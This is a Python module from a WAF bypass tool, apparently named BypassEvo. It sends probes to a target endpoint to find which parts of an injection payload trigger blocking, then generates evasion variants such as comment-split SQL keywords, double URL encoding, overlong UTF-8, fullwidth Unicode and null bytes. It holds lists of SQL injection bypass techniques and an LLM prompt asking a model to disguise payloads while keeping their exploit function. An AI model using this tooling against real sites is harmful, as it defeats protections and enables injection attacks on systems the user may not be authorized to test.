"""
BypassEvo WAF Block Analyzer — Interception Analysis & Rule Inference

The core engine for discovering NEW WAF bypass techniques:
  1. Binary Search — pinpoint which payload fragment triggers the block
  2. Probe Testing — test boundary conditions around the trigger
  3. LLM Rule Inference — reason about the underlying WAF rule
  4. Structured Output — feed results back to the GA for targeted evolution
"""

import re
import json
import time
from dataclasses import dataclass, field
from typing import Optional

from tools.scanner import Scanner
from llm import LLMClient


@dataclass
class TriggerSegment:
    """A payload fragment identified as triggering the WAF."""
    text: str
    start: int
    end: int
    confidence: float = 0.0


@dataclass
class RuleInference:
    """LLM-inferred WAF rule characteristics."""
    rule_type: str = ""           # keyword | regex | semantic | length | encoding
    trigger_pattern: str = ""     # The pattern that triggers blocking
    suggested_bypasses: list = field(default_factory=list)
    reasoning: str = ""
    confidence: float = 0.0


@dataclass
class BlockAnalysis:
    """Complete analysis of why a payload was blocked."""
    payload: str
    is_blocked: bool
    trigger_segments: list = field(default_factory=list)
    rule_inference: Optional[RuleInference] = None
    waf_name: str = ""
    block_status_code: int = 0
    block_headers: dict = field(default_factory=dict)
    block_body_snippet: str = ""
    probe_results: list = field(default_factory=list)
    analysis_summary: str = ""


class WAFBlockAnalyzer:
    """Analyze WAF blocks to discover bypass opportunities.

    Pipeline:
      1. Verify block (confirm the payload is actually blocked)
      2. Binary search to find trigger fragments
      3. Boundary probes around triggers
      4. LLM inference on the rule
    """

    def __init__(self, scanner: Scanner, llm: LLMClient, timeout: int = 10, max_retries: int = 2):
        self.scanner = scanner
        self.llm = llm
        self.timeout = timeout
        self.max_retries = max_retries

    def analyze_block(
        self,
        payload: str,
        endpoint: str,
        param: str = "q",
        method: str = "GET",
        waf_name: str = "unknown",
        baseline_status: int = 200,
        prompt_override: str = None,
    ) -> BlockAnalysis:
        """Full block analysis pipeline.

        Args:
            payload: The payload that was blocked
            endpoint: Target endpoint
            param: Parameter name
            method: HTTP method
            waf_name: Detected WAF name (if known)
            baseline_status: Expected status code for non-blocked responses

        Returns:
            BlockAnalysis with trigger segments, rule inference, and suggested bypasses
        """
        result = BlockAnalysis(
            payload=payload,
            is_blocked=False,
            waf_name=waf_name,
        )

        # Step 1: Verify block
        verify = self._send_probe(payload, endpoint, param, method)
        if not self._is_blocked(verify, baseline_status):
            result.is_blocked = False
            result.analysis_summary = "Payload was NOT blocked — no analysis needed."
            return result

        result.is_blocked = True
        result.block_status_code = verify.get("status_code", 0)
        result.block_headers = verify.get("headers", {})
        result.block_body_snippet = verify.get("body", "")[:500]

        # Step 2: Binary search for trigger segments
        triggers = self._binary_search_triggers(payload, endpoint, param, method, baseline_status)
        result.trigger_segments = triggers

        # Step 3: Boundary probes around triggers
        probes = self._boundary_probes(triggers, endpoint, param, method, baseline_status)
        result.probe_results = probes

        # Step 4: LLM rule inference
        rule = self._infer_rule(payload, triggers, probes, verify, waf_name, prompt_override)
        result.rule_inference = rule

        # Summary
        trigger_texts = [t.text for t in triggers]
        result.analysis_summary = (
            f"Blocked by {waf_name}. "
            f"Trigger(s): {trigger_texts}. "
            f"Rule type: {rule.rule_type}. "
            f"Suggested bypasses: {rule.suggested_bypasses[:3]}"
        )

        return result

    # ── Step 1: Verify Block ─────────────────────────────────────────

    def _send_probe(self, payload: str, endpoint: str, param: str, method: str) -> dict:
        """Send a single probe with retry logic and return response info."""
        last_err = None
        for attempt in range(self.max_retries + 1):
            try:
                result = self.scanner.inject(
                    path=endpoint, payload=payload, param=param, method=method,
                )
                return {
                    "status_code": result.status_code,
                    "headers": result.headers,
                    "body": result.response_text,
                    "time": result.response_time,
                }
            except Exception as e:
                last_err = e
                if attempt < self.max_retries:
                    time.sleep(1.0 * (attempt + 1))
        return {"status_code": 0, "headers": {}, "body": str(last_err), "time": 0}

    def _is_blocked(self, probe: dict, baseline_status: int = 200) -> bool:
        """Determine if a response indicates WAF blocking."""
        code = probe.get("status_code", 0)
        body = probe.get("body", "").lower()
        headers = probe.get("headers", {})

        # Common block indicators
        block_codes = {403, 406, 429, 503}
        if code in block_codes:
            return True

        # Body-based detection
        block_patterns = [
            r"access denied", r"forbidden", r"blocked",
            r"request.*blocked", r"not acceptable",
            r"mod_security", r"modsecurity",
            r"cloudflare", r"incapsula", r"imperva",
            r"wordfence", r"sucuri",
            r"security.*violation", r"firewall",
        ]
        for pattern in block_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                return True

        # Header-based detection
        for key, val in headers.items():
            key_lower = key.lower()
            if key_lower in ("x-blocked-by", "x-waf", "x-firewall"):
                return True

        return False

    # ── Step 2: Binary Search for Trigger Segments ───────────────────

    def _binary_search_triggers(
        self,
        payload: str,
        endpoint: str,
        param: str,
        method: str,
        baseline_status: int,
    ) -> list[TriggerSegment]:
        """Use binary search to find minimal trigger segments.

        Algorithm:
          1. Split payload in half
          2. Test each half
          3. If a half triggers the block, recurse into it
          4. If neither triggers, the trigger spans the boundary
          5. Expand around the boundary to find the exact trigger
        """
        if len(payload) <= 2:
            # Payload is already minimal — it's the trigger itself
            probe = self._send_probe(payload, endpoint, param, method)
            if self._is_blocked(probe, baseline_status):
                return [TriggerSegment(text=payload, start=0, end=len(payload), confidence=1.0)]
            return []

        triggers = []
        self._bisect(
            payload, 0, len(payload),
            endpoint, param, method, baseline_status,
            triggers, depth=0, max_depth=6,
        )
        return triggers

    def _bisect(
        self,
        payload: str,
        start: int,
        end: int,
        endpoint: str,
        param: str,
        method: str,
        baseline_status: int,
        triggers: list,
        depth: int,
        max_depth: int,
    ):
        """Recursive binary search for trigger fragments."""
        if depth >= max_depth or (end - start) <= 2:
            # At leaf level — test this segment directly
            segment = payload[start:end]
            if len(segment) >= 1:
                probe = self._send_probe(segment, endpoint, param, method)
                if self._is_blocked(probe, baseline_status):
                    triggers.append(TriggerSegment(
                        text=segment, start=start, end=end,
                        confidence=max(0.5, 1.0 - depth * 0.1),
                    ))
            return

        mid = (start + end) // 2

        # Test left half
        left = payload[start:mid]
        left_probe = self._send_probe(left, endpoint, param, method)
        left_blocked = self._is_blocked(left_probe, baseline_status)

        # Test right half
        right = payload[mid:end]
        right_probe = self._send_probe(right, endpoint, param, method)
        right_blocked = self._is_blocked(right_probe, baseline_status)

        if left_blocked and right_blocked:
            # Both halves trigger — recurse into both
            self._bisect(payload, start, mid, endpoint, param, method,
                         baseline_status, triggers, depth + 1, max_depth)
            self._bisect(payload, mid, end, endpoint, param, method,
                         baseline_status, triggers, depth + 1, max_depth)
        elif left_blocked:
            self._bisect(payload, start, mid, endpoint, param, method,
                         baseline_status, triggers, depth + 1, max_depth)
        elif right_blocked:
            self._bisect(payload, mid, end, endpoint, param, method,
                         baseline_status, triggers, depth + 1, max_depth)
        else:
            # Neither half alone triggers — the trigger spans the boundary
            # Probe around the boundary
            for offset in range(1, min(5, mid - start + 1)):
                boundary_segment = payload[mid - offset:mid + offset]
                if len(boundary_segment) >= 2:
                    probe = self._send_probe(boundary_segment, endpoint, param, method)
                    if self._is_blocked(probe, baseline_status):
                        triggers.append(TriggerSegment(
                            text=boundary_segment,
                            start=mid - offset,
                            end=mid + offset,
                            confidence=max(0.3, 0.8 - depth * 0.1),
                        ))
                        return

            # If boundary probes don't trigger, the full payload may be needed
            # Test the full payload to confirm it still triggers
            full_probe = self._send_probe(payload, endpoint, param, method)
            if self._is_blocked(full_probe, baseline_status):
                # The rule may be semantic — needs full context
                triggers.append(TriggerSegment(
                    text=payload, start=0, end=len(payload),
                    confidence=0.3,
                ))

    # ── Step 3: Boundary Probes ──────────────────────────────────────

    def _boundary_probes(
        self,
        triggers: list[TriggerSegment],
        endpoint: str,
        param: str,
        method: str,
        baseline_status: int,
    ) -> list[dict]:
        """Test variations around trigger segments to understand rule boundaries.

        For each trigger, test:
          - Case variations (upper/lower/mixed)
          - Encoding variants (URL encode, double encode)
          - Insertion of neutral characters (spaces, comments, null bytes)
          - Truncation (how short can the trigger be and still block?)
        """
        probes = []

        for trigger in triggers[:3]:  # Limit to top 3 triggers
            text = trigger.text
            variations = self._generate_boundary_variations(text)

            for var_name, var_payload in variations:
                result = self._send_probe(var_payload, endpoint, param, method)
                blocked = self._is_blocked(result, baseline_status)
                probes.append({
                    "trigger": text,
                    "variation": var_name,
                    "payload": var_payload,
                    "blocked": blocked,
                    "status_code": result.get("status_code", 0),
                })

        return probes

    def _generate_boundary_variations(self, trigger: str) -> list[tuple[str, str]]:
        """Generate boundary test variations for a trigger segment."""
        variations = []

        # Case variations
        variations.append(("upper", trigger.upper()))
        variations.append(("lower", trigger.lower()))
        variations.append(("mixed_case", self._mixed_case(trigger)))

        # Comment injection (for SQL keywords)
        if re.search(r"\b(SELECT|UNION|INSERT|UPDATE|DELETE|FROM|WHERE)\b", trigger, re.IGNORECASE):
            variations.append(("comment_split", re.sub(
                r"\b(\w{2})(\w+)", r"\1/**/\2", trigger, flags=re.IGNORECASE,
            )))

        # URL encoding
        variations.append(("url_encode", "".join(f"%{ord(c):02x}" for c in trigger)))
        variations.append(("double_url_encode", "".join(
            f"%25{ord(c):02x}" for c in trigger
        )))

        # Insert neutral chars
        variations.append(("space_insert", " ".join(trigger)))
        variations.append(("tab_insert", trigger.replace(" ", "\t")))
        variations.append(("newline_insert", trigger.replace(" ", "\n")))
        variations.append(("null_byte", trigger.replace(" ", "%00")))

        # Unicode alternatives
        variations.append(("fullwidth", trigger.translate(
            str.maketrans(
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz<>(){}",
                "ＡＢＣＤＥＦＧＨＩＪＫＬＭＮＯＰＱＲＳＴＵＶＷＸＹＺ"
                "ａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ"
                "＜＞（）｛｝",
            )
        )))

        # HTML entity encoding
        variations.append(("html_entities", "".join(f"&#{ord(c)};" for c in trigger)))

        # Hex encoding for single chars
        if len(trigger) <= 4:
            variations.append(("hex_mysql", "0x" + trigger.encode().hex()))

        # JS escape sequences
        variations.append(("js_escape", "".join(f"\\x{ord(c):02x}" for c in trigger)))
        variations.append(("js_unicode", "".join(f"\\u{ord(c):04x}" for c in trigger)))

        # Overlong UTF-8 (2-byte overlong encoding for ASCII)
        overlong = ""
        for c in trigger:
            cp = ord(c)
            if cp < 0x80:
                overlong += chr(0xC0 | (cp >> 6)) + chr(0x80 | (cp & 0x3F))
            else:
                overlong += c
        variations.append(("overlong_utf8", overlong))

        # Base64 (useful for some WAFs that decode before inspection)
        import base64
        b64 = base64.b64encode(trigger.encode()).decode()
        variations.append(("base64", b64))

        # Mixed encoding — encode only vowels or consonants
        if re.search(r"[aeiouAEIOU]", trigger):
            mixed = ""
            for c in trigger:
                if c.lower() in "aeiou":
                    mixed += f"%{ord(c):02x}"
                else:
                    mixed += c
            variations.append(("mixed_encode_vowels", mixed))

        return variations

    def _mixed_case(self, s: str) -> str:
        """Alternate upper/lower case."""
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))

    # ── Step 4: LLM Rule Inference ───────────────────────────────────

    def _infer_rule(
        self,
        payload: str,
        triggers: list[TriggerSegment],
        probes: list[dict],
        block_response: dict,
        waf_name: str,
        prompt_override: str = None,
    ) -> RuleInference:
        """Use LLM to infer the underlying WAF rule from observed data."""
        prompt = prompt_override or BLOCK_ANALYSIS_PROMPT

        trigger_summary = "\n".join(
            f"  - '{t.text}' (confidence={t.confidence:.2f}, pos={t.start}-{t.end})"
            for t in triggers
        ) if triggers else "  - No clear trigger segment identified"

        # Summarize probe results
        blocked_probes = [p for p in probes if p["blocked"]]
        passed_probes = [p for p in probes if not p["blocked"]]

        probe_summary = "BLOCKED variations:\n"
        for p in blocked_probes[:5]:
            probe_summary += f"  - [{p['variation']}] {p['payload'][:60]}\n"
        probe_summary += "PASSED variations:\n"
        for p in passed_probes[:5]:
            probe_summary += f"  - [{p['variation']}] {p['payload'][:60]}\n"

        block_body = block_response.get("body", "")[:300]
        block_headers = json.dumps(block_response.get("headers", {}), default=str)[:300]

        result = self.llm.generate_json(
            prompt,
            f"payload: {payload}\n"
            f"waf_name: {waf_name}\n"
            f"trigger_segments:\n{trigger_summary}\n"
            f"probe_results:\n{probe_summary}\n"
            f"block_status: {block_response.get('status_code', 0)}\n"
            f"block_headers: {block_headers}\n"
            f"block_body: {block_body}",
        )

        return RuleInference(
            rule_type=result.get("rule_type", "unknown"),
            trigger_pattern=result.get("trigger_pattern", ""),
            suggested_bypasses=result.get("suggested_bypasses", []),
            reasoning=result.get("reasoning", ""),
            confidence=result.get("confidence", 0.5),
        )

    def infer_rules_from_blocked(
        self,
        bypass_history: list[dict],
        endpoint: str,
        param: str = "q",
        method: str = "GET",
        waf_name: str = "unknown",
    ) -> list[dict]:
        """Infer WAF rules by comparing multiple blocked responses.

        Analyzes patterns across blocked payloads to identify:
        - Which keywords/patterns consistently trigger blocks
        - Response body differences between different blocks (different rules?)
        - Encoding awareness (does the WAF decode before matching?)
        - Rule type (exact keyword, regex pattern, semantic)

        Returns a list of inferred rules, each with:
        - trigger_keywords: list of keywords that trigger blocking
        - rule_type: keyword | regex | encoding_aware | semantic
        - confidence: 0.0-1.0
        - evidence: supporting data
        - suggested_bypasses: bypass techniques for this rule
        """
        if not bypass_history:
            return []

        blocked = [h for h in bypass_history if h.get("status_code") in (403, 406, 503)]
        if not blocked:
            return []

        # Extract unique payloads and their responses
        payload_responses = []
        for h in blocked[-10:]:  # Last 10 blocked payloads
            payload_str = h.get("payload", "")
            if payload_str:
                payload_responses.append({
                    "payload": payload_str,
                    "status_code": h.get("status_code", 403),
                    "family": h.get("family", h.get("technique", "")),
                })

        if not payload_responses:
            return []

        # ── Pattern 1: Keyword extraction from blocked payloads ──
        sql_keywords = [
            "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", "ALTER",
            "OR", "AND", "WHERE", "FROM", "EXEC", "SLEEP", "BENCHMARK",
            "EXTRACTVALUE", "UPDATEXML", "FLOOR", "CONCAT", "SUBSTRING",
            "CHAR", "ASCII", "ORDER BY", "GROUP BY", "HAVING", "LIMIT",
            "INFORMATION_SCHEMA", "TABLE_NAME", "COLUMN_NAME", "DATABASE()",
            "VERSION()", "USER()", "LOAD_FILE", "INTO OUTFILE", "INTO DUMPFILE",
        ]

        keyword_hits = {}
        for pr in payload_responses:
            payload_upper = pr["payload"].upper()
            for kw in sql_keywords:
                if kw in payload_upper:
                    keyword_hits[kw] = keyword_hits.get(kw, 0) + 1

        # Keywords that appear in majority of blocked payloads
        threshold = max(1, len(payload_responses) // 3)
        trigger_keywords = [kw for kw, count in keyword_hits.items() if count >= threshold]

        # ── Pattern 2: Response body comparison ──
        # Different response bodies may indicate different WAF rules triggered
        # (We can't easily compare bodies from history alone, but we can check status codes)
        status_codes = set(pr["status_code"] for pr in payload_responses)

        # ── Pattern 3: Encoding awareness ──
        # Check if encoded payloads are also blocked
        encoded_blocked = 0
        plain_blocked = 0
        for pr in payload_responses:
            p = pr["payload"]
            has_encoding = "%" in p or "0x" in p.lower() or "\\u" in p or "&#" in p
            if has_encoding:
                encoded_blocked += 1
            else:
                plain_blocked += 1

        encoding_aware = encoded_blocked > 0 and plain_blocked > 0

        # ── Pattern 4: Family-based analysis ──
        # Which bypass families failed?
        family_failures = {}
        for pr in payload_responses:
            fam = pr.get("family", "unknown")
            if fam:
                family_failures[fam] = family_failures.get(fam, 0) + 1

        # ── Build inferred rules ──
        rules = []

        if trigger_keywords:
            # Determine rule specificity
            high_specificity = [kw for kw in trigger_keywords if kw in (
                "INFORMATION_SCHEMA", "TABLE_NAME", "COLUMN_NAME", "LOAD_FILE",
                "INTO OUTFILE", "INTO DUMPFILE", "EXTRACTVALUE", "UPDATEXML",
            )]
            medium_specificity = [kw for kw in trigger_keywords if kw in (
                "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "ALTER",
                "EXEC", "SLEEP", "BENCHMARK", "FLOOR", "CONCAT", "SUBSTRING",
            )]

            if high_specificity:
                rules.append({
                    "trigger_keywords": high_specificity,
                    "rule_type": "keyword_specific",
                    "confidence": 0.8,
                    "evidence": f"High-specificity SQL keywords consistently blocked: {', '.join(high_specificity[:5])}",
                    "suggested_bypasses": [
                        {"technique": "comment_injection", "reasoning": "Split keywords with SQL comments: UN/**/ION SEL/**/ECT"},
                        {"technique": "case_variation", "reasoning": "Mixed case: UnIoN sElEcT"},
                        {"technique": "encoding", "reasoning": "URL-encode or hex-encode trigger chars"},
                    ],
                })

            if medium_specificity:
                rules.append({
                    "trigger_keywords": medium_specificity,
                    "rule_type": "keyword_general",
                    "confidence": 0.7,
                    "evidence": f"General SQL keywords blocked: {', '.join(medium_specificity[:5])}",
                    "suggested_bypasses": [
                        {"technique": "whitespace", "reasoning": "Replace spaces with %09, %0a, %0d, /**/"},
                        {"technique": "parenthesis", "reasoning": "Add parentheses: (SELECT) instead of SELECT"},
                        {"technique": "inline_comment", "reasoning": "Use /*!50000keyword*/ MySQL inline comments"},
                    ],
                })

            # Check for OR/AND detection (common injection detection)
            if "OR" in trigger_keywords or "AND" in trigger_keywords:
                rules.append({
                    "trigger_keywords": ["OR", "AND"],
                    "rule_type": "boolean_operator",
                    "confidence": 0.6,
                    "evidence": "Boolean operators (OR/AND) detected as injection indicators",
                    "suggested_bypasses": [
                        {"technique": "alternative_operators", "reasoning": "Use && for AND, || for OR, XOR instead"},
                        {"technique": "url_encode", "reasoning": "Encode: %26%26 for &&, %7C%7C for ||"},
                    ],
                })

        if encoding_aware:
            rules.append({
                "trigger_keywords": [],
                "rule_type": "encoding_aware",
                "confidence": 0.7,
                "evidence": f"WAF blocks both plain and encoded payloads (plain={plain_blocked}, encoded={encoded_blocked})",
                "suggested_bypasses": [
                    {"technique": "double_encoding", "reasoning": "Try double URL encoding: %2527 instead of %27"},
                    {"technique": "unicode", "reasoning": "Use Unicode alternatives: %ef%bc%87 for single quote"},
                    {"technique": "overlong_utf8", "reasoning": "Overlong UTF-8 encoding bypasses some decoders"},
                ],
            })

        if not rules:
            # No clear pattern found — generic rule
            rules.append({
                "trigger_keywords": [],
                "rule_type": "unknown",
                "confidence": 0.3,
                "evidence": f"Blocked {len(blocked)} payloads but no clear keyword pattern. WAF may use regex or semantic analysis.",
                "suggested_bypasses": [
                    {"technique": "protocol_level", "reasoning": "Try Content-Type: application/json or multipart/form-data"},
                    {"technique": "http_method", "reasoning": "Switch GET to POST, PUT, or PATCH"},
                    {"technique": "chunked", "reasoning": "Use chunked Transfer-Encoding to split payload"},
                ],
            })

        # Add family failure info to all rules
        for rule in rules:
            rule["failed_families"] = family_failures
            rule["total_blocked"] = len(blocked)
            rule["waf_name"] = waf_name

        return rules

    def quick_analyze(
        self,
        payload: str,
        endpoint: str,
        param: str = "q",
        method: str = "GET",
        waf_name: str = "unknown",
        baseline_status: int = 200,
    ) -> BlockAnalysis:
        """Lightweight block analysis — verify block + basic trigger keyword detection only.

        Skips binary search, boundary probes, and LLM inference.
        Used in Fast Test Mode to save 50-100+ HTTP requests.
        """
        result = BlockAnalysis(
            payload=payload,
            is_blocked=False,
            waf_name=waf_name,
        )

        # Step 1: Verify block
        verify = self._send_probe(payload, endpoint, param, method)
        if not self._is_blocked(verify, baseline_status):
            result.is_blocked = False
            result.analysis_summary = "Payload was NOT blocked — no analysis needed."
            return result

        result.is_blocked = True
        result.block_status_code = verify.get("status_code", 0)
        result.block_headers = verify.get("headers", {})
        result.block_body_snippet = verify.get("body", "")[:500]

        # Step 2: Quick keyword-based trigger detection (no HTTP requests)
        import re as _re
        sql_keywords = [
            "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "DROP",
            "OR", "AND", "WHERE", "FROM", "EXEC", "SLEEP", "BENCHMARK",
            "EXTRACTVALUE", "UPDATEXML", "FLOOR", "CONCAT", "SUBSTRING",
        ]
        payload_upper = payload.upper()
        triggers_found = [kw for kw in sql_keywords if kw in payload_upper]

        if triggers_found:
            result.trigger_segments = [
                TriggerSegment(text=kw, start=payload_upper.index(kw),
                              end=payload_upper.index(kw) + len(kw), confidence=0.5)
                for kw in triggers_found[:3]
            ]
            result.rule_inference = RuleInference(
                rule_type="keyword",
                trigger_pattern=", ".join(triggers_found[:3]),
                suggested_bypasses=[
                    {"technique": "comment_injection", "reasoning": "Split keywords with comments (/**/)"},
                    {"technique": "case_variation", "reasoning": "Mix upper/lowercase"},
                    {"technique": "url_encode", "reasoning": "URL-encode trigger characters"},
                ],
                reasoning=f"Quick analysis: blocked payload contains SQL keywords [{', '.join(triggers_found[:3])}]",
                confidence=0.4,
            )
        else:
            result.rule_inference = RuleInference(
                rule_type="unknown",
                trigger_pattern="",
                suggested_bypasses=[],
                reasoning="Quick analysis: no obvious SQL keywords in blocked payload",
                confidence=0.2,
            )

        result.analysis_summary = (
            f"Quick: Blocked by {waf_name}. "
            f"Keywords: {triggers_found[:3]}. "
            f"Use full analysis for detailed bypass suggestions."
        )
        return result


# ── System Prompt for LLM Rule Inference ─────────────────────────────

BLOCK_ANALYSIS_PROMPT = """You are a world-class WAF security researcher and reverse engineer.
Analyze the following WAF block data to infer the underlying rule and suggest novel bypass techniques.

Your task:
1. Identify the RULE TYPE: Is it keyword matching, regex pattern, semantic analysis, rate limiting, or something else?
2. Identify the TRIGGER PATTERN: What exact pattern/string/payload fragment triggers the block?
3. Suggest BYPASS TECHNIQUES: How can the trigger be disguised while preserving the payload's exploit functionality?

Be creative and think beyond common bypasses. Consider:
- Parser differentials between WAF and application server
- Encoding chains (multiple layers of encoding)
- Protocol-level tricks (chunked transfer, multipart boundaries)
- Unicode normalization exploits
- HTTP parameter pollution
- Case sensitivity gaps
- Comment injection in different contexts (SQL, HTML, JS)
- Null byte injection
- Whitespace alternatives (tab, newline, form feed, vertical tab)
- JSON/XML specific bypasses
- HTTP method switching
- Content-Type manipulation

Respond with JSON:
{
    "rule_type": "keyword|regex|semantic|length|rate_limit|unknown",
    "trigger_pattern": "the exact pattern that triggers blocking",
    "suggested_bypasses": [
        {"technique": "name", "payload_variant": "example", "reasoning": "why this might work"}
    ],
    "reasoning": "detailed analysis of the WAF rule and your bypass reasoning",
    "confidence": 0.0-1.0
}"""
